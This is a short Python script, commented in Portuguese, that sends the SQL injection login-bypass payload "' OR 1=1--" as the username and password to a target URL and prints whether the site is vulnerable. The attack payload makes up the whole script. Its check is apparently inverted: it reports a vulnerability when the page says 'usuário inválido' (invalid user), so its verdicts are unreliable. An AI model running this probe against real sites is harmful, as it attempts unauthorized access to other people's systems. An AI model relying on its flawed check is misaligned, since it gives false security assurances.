import requests

# Definindo a URL do site a ser testado
url = ''

# Definindo o payload de teste
payload = "' OR 1=1--"

# Enviando a solicitação GET com o payload injetado na URL
response = requests.get(url + "?username=" + payload + "&password=" + payload)

# Verificando a resposta do servidor
if "usuário inválido" in response.text:
    print("[*] Vulnerabilidade de injeção de SQL detectada!")
else:
    print("[*] O site não é vulnerável a injeção de SQL.")
